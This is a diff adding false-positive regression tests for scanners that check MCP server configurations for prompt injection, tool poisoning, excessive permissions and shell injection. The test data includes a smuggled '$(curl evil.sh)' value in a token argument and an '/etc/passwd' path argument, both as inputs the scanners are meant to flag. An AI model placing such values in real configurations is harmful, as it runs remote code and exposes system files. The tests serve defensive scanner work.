@@ -2,6 +2,10 @@ import { describe, it, expect } from 'vitest';
 import { scanAst } from '../../src/scanners/ast-scanner.js';
 import { scanDataControls } from '../../src/scanners/data-controls-scanner.js';
 import { scanNetworkEgress } from '../../src/scanners/network-egress-scanner.js';
+import { scanPromptInjection } from '../../src/scanners/prompt-injection-scanner.js';
+import { scanToolPoisoning } from '../../src/scanners/tool-poisoning-scanner.js';
+import { scanPermissions } from '../../src/scanners/permission-scanner.js';
+import { scanConfig } from '../../src/scanners/config-scanner.js';
 import { PII_PATTERNS } from '../../src/data/pii-patterns.js';
 import { ResolvedServer } from '../../src/types/config.js';
 
@@ -106,5 +110,70 @@ describe('Scanner false-positive regressions', () => {
       const endpointFindings = findings.filter(f => f.id.includes('endpoint') || f.id.includes('egress'));
       expect(endpointFindings.length).toBeGreaterThan(0);
     });
+  });
+});
+
+describe('Scanner false-positive regressions (batch 2)', () => {
+  it('prompt-injection: "acts as a proxy" is not "act as" injection', () => {
+    const findings = scanPromptInjection({
+      name: 'proxy', toolName: 't', configPath: 'p', command: 'node',
+      description: 'This server acts as a proxy between the model and the backend.',
+    } as unknown as ResolvedServer);
+    expect(findings.some(f => f.id === 'prompt-injection-pattern' && f.description.includes('act as'))).toBe(false);
+  });
+
+  it('prompt-injection: "server runs on port 3000" is not tool-name shadowing', () => {
+    const findings = scanPromptInjection({
+      name: 'web', toolName: 't', configPath: 'p', command: 'node',
+      description: 'Server runs on port 3000 and serves requests.',
+    } as unknown as ResolvedServer);
+    expect(findings.some(f => f.id === 'tool-name-shadow' && f.description.includes('run'))).toBe(false);
+  });
+
+  it('tool-poisoning: postgres mentions are not POST exfiltration', () => {
+    const findings = scanToolPoisoning({
+      name: 'db', toolName: 't', configPath: 'p', command: 'node',
+      description: 'Tool that queries a postgres database and returns rows.',
+    } as unknown as ResolvedServer);
+    expect(findings.some(f => f.id === 'tool-exfiltration-risk')).toBe(false);
+  });
+
+  it('tool-poisoning: "list and create files" on a file manager is not capability escalation', () => {
+    const findings = scanToolPoisoning({
+      name: 'file-manager', toolName: 't', configPath: 'p', command: 'node',
+      description: 'List and create files in the workspace directory.',
+    } as unknown as ResolvedServer);
+    expect(findings.some(f => f.id === 'capability-escalation-risk')).toBe(false);
+  });
+
+  it('tool-poisoning: read-only named tool claiming writes IS escalation', () => {
+    const findings = scanToolPoisoning({
+      name: 'read_file', toolName: 't', configPath: 'p', command: 'node',
+      description: 'Writes and modifies arbitrary files on the host.',
+    } as unknown as ResolvedServer);
+    expect(findings.some(f => f.id === 'capability-escalation-risk')).toBe(true);
+  });
+
+  it('permission-scanner: /etc/passwd and --dir=/ are dangerous', () => {
+    const findings = scanPermissions({
+      name: 'x', toolName: 't', configPath: 'p', command: 'node',
+      args: ['/etc/passwd', '--dir=/usr/bin'],
+    } as unknown as ResolvedServer);
+    const dangerous = findings.filter(f => f.id === 'excessive-permissions');
+    expect(dangerous).toHaveLength(2);
+  });
+
+  it('config-scanner: ${apiKey} lowercase is a simple env ref, $(cmd) is not', () => {
+    const simple = scanConfig({
+      name: 'x', toolName: 't', configPath: 'p', command: 'node',
+      args: ['--token=${apiKey}'],
+    } as unknown as ResolvedServer);
+    expect(simple.filter(f => f.id === 'shell-injection-risk' && f.severity === 'CRITICAL')).toHaveLength(0);
+
+    const dangerous = scanConfig({
+      name: 'x', toolName: 't', configPath: 'p', command: 'node',
+      args: ['--token=$(curl evil.sh)'],
+    } as unknown as ResolvedServer);
+    expect(dangerous.filter(f => f.id === 'shell-injection-risk' && f.severity === 'CRITICAL')).toHaveLength(1);
   });
 });
